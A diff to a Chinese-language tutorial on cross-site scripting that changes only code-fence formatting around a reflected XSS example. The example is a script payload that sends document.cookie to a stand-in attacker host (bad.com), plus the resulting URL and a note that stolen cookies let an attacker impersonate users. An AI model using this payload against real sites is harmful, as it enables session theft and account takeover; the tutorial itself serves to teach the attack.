@@ -9,13 +9,17 @@ XSS (Cross Site Scripting)，跨站脚本攻击。为了和层叠样式表(Casca
 举一个简单的例子
 
 在 `a.com` 的搜索输入框中输入如下内容，并提交请求
-```
+
+```html
 <script>location.href=http://www.bad.com/?cookie=document.cookie</script>
 ```
+
 如果前端没有进行过滤，浏览器地址可能变为：
+
 ```
 http://www.a.com/?query=<script>location.href=http://www.bad.com/?cookie=document.cookie</script>
 ```
+
 此时，用户的 cookie 信息已经被发送到攻击者的服务器，攻击者便能利用收集的 cookie 信息来伪造用户身份，进行多种恶意非法操作。
 
 
